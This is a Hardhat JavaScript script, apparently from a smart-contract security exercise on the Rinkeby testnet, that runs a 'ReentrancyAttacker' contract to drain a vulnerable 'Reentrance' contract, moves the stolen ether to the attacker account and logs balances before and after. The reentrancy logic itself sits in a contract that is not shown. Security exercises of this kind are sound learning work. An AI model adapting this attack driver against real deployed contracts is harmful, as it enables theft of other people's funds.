const { ethers, network, getNamedAccounts, waffle } = require("hardhat");
const { networkConfig } = require("../helper-hardhat-config");

async function stealFunds() {
  const chainId = network.config.chainId;
  if (chainId == 4) {
    const { deployer } = await getNamedAccounts();
    const waitBlockConfirmations = 1;
    const provider = waffle.provider;
    const aReentrancy = networkConfig[chainId]["reentrancy"];

    // get ReentrancyAttacker contract
    const cReentrancyAttacker = await ethers.getContract("ReentrancyAttacker");

    // initial balances
    const balanceAttackerBefore = await provider.getBalance(deployer)
    const balanceReentranceBefore = await provider.getBalance(aReentrancy);
    console.log(
      "Initial balance of the Attacker account: ",
      ethers.utils.formatEther(balanceAttackerBefore)
    );
    console.log(
      "Initial balance of the Reentrance contract: ",
      ethers.utils.formatEther(balanceReentranceBefore)
    );

    // steal funds
    console.log("Stealing the funds...");
    const tx1 = await cReentrancyAttacker.stealFunds({
      value: ethers.utils.parseEther("0.01"),
      gasLimit: "100000",
    });
    await tx1.wait();
    console.log("Transaction hash: ", tx1.hash);

    // send funds to account
    console.log("Sending the stolen funds to the Attacker account...");
    const tx2 = await cReentrancyAttacker.emptyContract({
      gasLimit: "100000",
    });
    await tx2.wait();
    console.log("Transaction hash: ", tx2.hash);

    const balanceReentranceAfter = await provider.getBalance(aReentrancy);
    console.log(
      "Final balance of Reentrance contract: ",
      ethers.utils.formatEther(balanceReentranceAfter)
    );
    const balanceAttackerAfter = await provider.getBalance(deployer);
    console.log(
      "Final balance of Attacker account: ",
      ethers.utils.formatEther(balanceAttackerAfter)
    );
  }
}

stealFunds()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
